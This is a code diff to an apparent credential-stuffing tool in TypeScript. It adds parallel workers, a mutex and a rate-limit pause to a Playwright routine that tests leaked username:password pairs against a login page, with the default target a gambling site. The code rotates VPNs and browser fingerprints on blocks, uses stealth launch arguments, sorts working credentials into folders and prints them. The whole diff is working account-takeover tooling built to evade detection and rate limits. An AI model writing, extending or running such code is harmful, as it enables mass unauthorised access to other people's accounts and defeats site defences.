@@ -446,12 +446,14 @@ export async function runLoginAuto(
     delayBetweenMs?: [number, number]; // [min, max] delay between attempts
     rotateEvery?:    number;            // rotate VPN every N attempts (0 = only on block)
     stopOnSuccess?:  boolean;           // stop after first working cred
+    concurrency?:    number;            // how many creds to process in parallel (default 3)
   } = {}
 ): Promise<void> {
   const {
     delayBetweenMs = [1000, 1000],
     rotateEvery    = 0,
     stopOnSuccess  = false,
+    concurrency    = 3,
   } = options;
 
   if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
@@ -520,6 +522,7 @@ export async function runLoginAuto(
     submitCss:   buildSel(submitEl, '#loginSubmit'),
   };
   console.log(`[auto] Precomputed selectors: user=${precomputedSelectors.usernameCss} pass=${precomputedSelectors.passwordCss} submit=${precomputedSelectors.submitCss}`);
+  console.log(`[auto] Concurrency: ${concurrency} worker(s)`);
 
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
@@ -527,6 +530,7 @@ export async function runLoginAuto(
   const hits: LoginAttempt[] = [];
   // Set module-level credsFile for cleanup handler access
   activeCredsFile = credsFile;
+  let stopEarly = false; // signal workers to stop (stopOnSuccess or rate-limit)
 
   const MAX_VISIBLE_ERROR_RETRIES = 3;
 
@@ -539,50 +543,115 @@ export async function runLoginAuto(
   let browserCredsProcessed = 0;
   const BROWSER_RECYCLE_INTERVAL = 25; // recycle browser every N creds to prevent memory leaks
 
+  // ── Mutex for shared resources (VPN, browser) ───────────────────────────────
+  // Simple async mutex to serialize VPN rotations and browser recycling
+  let mutexQueue: Array<() => void> = [];
+  let mutexLocked = false;
+
+  async function acquireMutex(): Promise<void> {
+    if (!mutexLocked) {
+      mutexLocked = true;
+      return;
+    }
+    return new Promise<void>(resolve => {
+      mutexQueue.push(resolve);
+    });
+  }
+
+  function releaseMutex(): void {
+    if (mutexQueue.length > 0) {
+      const next = mutexQueue.shift()!;
+      next();
+    } else {
+      mutexLocked = false;
+    }
+  }
+
   async function ensureBrowser(): Promise<Browser> {
     if (browser && browser.isConnected()) return browser;
-    browser = await chromium.launch({
-      headless: true,
-      args: STEALTH_LAUNCH_ARGS,
-      ignoreHTTPSErrors: true as any,
-    } as any);
-    browserCredsProcessed = 0;
-    return browser;
+    await acquireMutex();
+    try {
+      if (browser && browser.isConnected()) return browser;
+      browser = await chromium.launch({
+        headless: true,
+        args: STEALTH_LAUNCH_ARGS,
+        ignoreHTTPSErrors: true as any,
+      } as any);
+      browserCredsProcessed = 0;
+      return browser;
+    } finally {
+      releaseMutex();
+    }
   }
 
   async function recycleBrowser(): Promise<void> {
-    try { await browser.close(); } catch {}
-    browser = await chromium.launch({
-      headless: true,
-      args: STEALTH_LAUNCH_ARGS,
-      ignoreHTTPSErrors: true as any,
-    } as any);
-    browserCredsProcessed = 0;
+    await acquireMutex();
+    try {
+      try { await browser.close(); } catch {}
+      browser = await chromium.launch({
+        headless: true,
+        args: STEALTH_LAUNCH_ARGS,
+        ignoreHTTPSErrors: true as any,
+      } as any);
+      browserCredsProcessed = 0;
+    } finally {
+      releaseMutex();
+    }
   }
 
-  // ── Loop through creds ──────────────────────────────────────────────────────
-  // Wrapped in try/finally to ensure buffers are flushed even on unexpected errors
-  try {
-  for (let i = 0; i < creds.length; i++) {
-    const { username, password } = creds[i];
-
-    // Rotate VPN based on rotateEvery setting (default 0 = only rotate on blocks)
-    if (rotateEvery > 0 && i > 0 && i % rotateEvery === 0) {
-      console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
+  async function safeRotateVpn(): Promise<void> {
+    await acquireMutex();
+    try {
       activeVpn = smartRotate();
       if (!activeVpn) {
         console.warn('[auto] VPN rotation failed — continuing with current connection.');
       }
+    } finally {
+      releaseMutex();
     }
+  }
 
-    // Recycle browser periodically to prevent memory leaks
-    if (browserCredsProcessed >= BROWSER_RECYCLE_INTERVAL) {
-      console.log(`[auto] Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds processed)...`);
-      await recycleBrowser();
-    }
+  // ── Rate-limit pause: blocks all workers until VPN is rotated ───────────────
+  let rateLimitPausePromise: Promise<void> | null = null;
+
+  async function handleRateLimit(): Promise<void> {
+    if (rateLimitPausePromise) return rateLimitPausePromise; // already pausing
+    console.warn(`\n[auto] Rate limit detected — pausing all workers, rotating VPN...`);
+    rateLimitPausePromise = (async () => {
+      await acquireMutex();
+      try {
+        activeVpn = smartRotate();
+        // Recycle browser too for fresh fingerprints
+        try { await browser.close(); } catch {}
+        browser = await chromium.launch({
+          headless: true,
+          args: STEALTH_LAUNCH_ARGS,
+          ignoreHTTPSErrors: true as any,
+        } as any);
+        browserCredsProcessed = 0;
+        console.log(`[auto] Rate limit recovery: new VPN=${activeVpn?.name ?? 'none'}, fresh browser`);
+      } finally {
+        releaseMutex();
+        rateLimitPausePromise = null;
+      }
+    })();
+    return rateLimitPausePromise;
+  }
+
+  // ── Worker: processes a single credential with retries ──────────────────────
+  async function processCredential(
+    credIndex: number,
+    username: string,
+    password: string,
+    totalCreds: number,
+  ): Promise<void> {
+    if (stopEarly) return;
+
+    // Wait if rate-limit pause is active
+    if (rateLimitPausePromise) await rateLimitPausePromise;
 
     let vpnName = activeVpn?.name ?? 'none';
-    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | vpn: ${vpnName}`);
+    console.log(`\n[auto] [${credIndex + 1}/${totalCreds}] ${username} | vpn: ${vpnName}`);
 
     let attempt: LoginAttempt = {
       url:        targetUrl,
@@ -596,13 +665,12 @@ export async function runLoginAuto(
       durationMs: 0,
     };
 
-    // Retry loop: if we get errors, rotate VPN and retry
-    // with a fresh context (up to MAX_VISIBLE_ERROR_RETRIES times)
     for (let retryNum = 0; retryNum <= MAX_VISIBLE_ERROR_RETRIES; retryNum++) {
+      if (stopEarly) break;
+      if (rateLimitPausePromise) await rateLimitPausePromise;
 
       await ensureBrowser();
 
-      // Fresh context per attempt = fresh cookies, storage, fingerprint
       const ctxOpts = getStealthContextOptions();
       const context = await browser.newContext({
         ...ctxOpts,
@@ -643,13 +711,20 @@ export async function runLoginAuto(
           if (activeVpn) vpnSuccess(activeVpn);
           succeeded++;
           hits.push(attempt);
+          if (stopOnSuccess) {
+            stopEarly = true;
+          }
+        } else if (outcome.outcome === 'rate_limited') {
+          console.log(`[auto] ✗ rate limited: ${username} — pausing all workers`);
+          await handleRateLimit();
+          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
         } else if (outcome.outcome === 'account_locked' && (outcome.message || '').includes('account has been')) {
           console.log(`[auto] ✗ account permanently locked: ${username} — moving on`);
         } else if (retryNum < MAX_VISIBLE_ERROR_RETRIES) {
           const isVisibleError = (outcome.message || '').includes('visible error selector triggered');
           console.warn(`[auto] ✗ ${outcome.outcome} on ${vpnName} — rotating VPN + fingerprint, retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})${isVisibleError ? ' [IMMEDIATE]' : ''}...`);
           if (activeVpn) vpnFail(activeVpn);
-          activeVpn = smartRotate();
+          await safeRotateVpn();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = true;
           (attempt as any)._immediateRetry = isVisibleError;
@@ -665,18 +740,16 @@ export async function runLoginAuto(
         if (activeVpn) vpnFail(activeVpn);
         if (isBlockError(err.message ?? '')) {
           console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
-          activeVpn = smartRotate();
+          await safeRotateVpn();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
-          // Force browser recycle on connection errors
           await recycleBrowser().catch(e => {
             console.error(`[auto] recycleBrowser failed: ${e.message?.split('\n')[0]}`);
-            shouldRetry = false; // can't continue without a browser
+            shouldRetry = false;
           });
         }
       }
 
-      // Close context only (keep browser alive)
       await context.close().catch(() => {});
       browserCredsProcessed++;
 
@@ -693,7 +766,6 @@ export async function runLoginAuto(
 
     // ── Sort and buffer credential removal ──
     try {
-      // Map outcome to folder
       const outcomeToFolder: Record<LoginOutcome, string> = {
         success:           'success',
         '2fa_required':    'success',
@@ -709,7 +781,6 @@ export async function runLoginAuto(
       if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
       fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);
 
-      // Buffer removal instead of rewriting creds.txt on every cred
       credRemoveBuffer.push({ username, password });
       if (credRemoveBuffer.length >= FLUSH_INTERVAL) {
         flushCredRemovals();
@@ -719,19 +790,47 @@ export async function runLoginAuto(
     }
 
     attempted++;
-
-    if (stopOnSuccess && succeeded > 0) {
-      console.log(`\n[auto] stopOnSuccess=true — stopping after first hit`);
-      break;
-    }
-
-    // Delay between attempts
-    if (i < creds.length - 1) {
-      const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
-      console.log(`[auto] Waiting ${(delay / 1000).toFixed(1)}s before next attempt...`);
-      await new Promise(r => setTimeout(r, delay));
-    }
   }
+
+  // ── Semaphore-based concurrency pool ────────────────────────────────────────
+  // Processes creds in chunks of `concurrency` workers at a time.
+  try {
+    // Check if browser recycle is needed periodically
+    let totalDispatched = 0;
+
+    for (let batchStart = 0; batchStart < creds.length; batchStart += concurrency) {
+      if (stopEarly) break;
+
+      // Rotate VPN based on rotateEvery setting
+      if (rotateEvery > 0 && totalDispatched > 0 && totalDispatched % rotateEvery === 0) {
+        console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
+        await safeRotateVpn();
+      }
+
+      // Recycle browser periodically
+      if (browserCredsProcessed >= BROWSER_RECYCLE_INTERVAL) {
+        console.log(`[auto] Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds processed)...`);
+        await recycleBrowser();
+      }
+
+      const batchEnd = Math.min(batchStart + concurrency, creds.length);
+      const batch = creds.slice(batchStart, batchEnd);
+
+      // Launch batch concurrently
+      const promises = batch.map((cred, j) =>
+        processCredential(batchStart + j, cred.username, cred.password, creds.length)
+      );
+      await Promise.allSettled(promises);
+
+      totalDispatched += batch.length;
+
+      // Inter-batch delay
+      if (batchEnd < creds.length && !stopEarly) {
+        const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
+        console.log(`[auto] Batch done. Waiting ${(delay / 1000).toFixed(1)}s before next batch...`);
+        await new Promise(r => setTimeout(r, delay));
+      }
+    }
   } finally {
     // Always flush buffers, even on unexpected errors
     flushResults();
@@ -741,7 +840,7 @@ export async function runLoginAuto(
 
   // ── Summary ─────────────────────────────────────────────────────────────────
   console.log(`\n${'─'.repeat(54)}`);
-  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s)`);
+  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s) | concurrency: ${concurrency}`);
   if (hits.length > 0) {
     console.log('[auto] Successful credentials:');
     for (const h of hits) {
@@ -766,8 +865,12 @@ process.on('SIGTERM', cleanup);
 
 // ── Allow direct execution ────────────────────────────────────────────────────
 if (require.main === module) {
-  const url = process.argv[2] || 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x';
-  runLoginAuto(url)
+  // Parse --concurrency=N from argv
+  const concurrencyArg = process.argv.find(a => a.startsWith('--concurrency='));
+  const concurrency = concurrencyArg ? parseInt(concurrencyArg.split('=')[1], 10) || 3 : 3;
+  const url = process.argv.find(a => !a.startsWith('--') && !a.includes('ts-node') && !a.includes('login-auto') && a !== process.argv[0]) 
+    || 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x';
+  runLoginAuto(url, './creds.txt', { concurrency })
     .then(() => { vpnDown(); })
     .catch(e => { console.error(e); vpnDown(); process.exit(1); });
 }
